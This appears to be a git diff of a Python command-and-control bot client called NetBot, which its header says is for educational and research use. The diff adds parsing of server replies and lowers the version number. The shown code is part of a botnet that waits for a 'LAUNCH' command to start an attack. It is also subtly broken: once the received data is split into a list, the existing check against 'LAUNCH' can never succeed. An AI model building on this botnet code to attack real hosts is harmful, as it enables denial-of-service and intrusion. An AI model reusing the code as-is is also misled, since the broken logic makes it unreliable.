@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 #
 # Author	 : Shankar Narayana Damodaran
-# Tool 		 : NetBot v1.2
+# Tool 		 : NetBot v1.0
 # 
 # Description	 : This is a command & control center client-server code.
 #              		Should be used only for educational, research purposes and internal use only.
@@ -71,6 +71,9 @@ def Main():
 		print('CCC Response:',str(data.decode()))
 		
 		data = str(data.decode())
+		data = data.split('_')
+		
+		print(data[2]);
 		
 		if data == "LAUNCH":
 			if attackSet == 0:
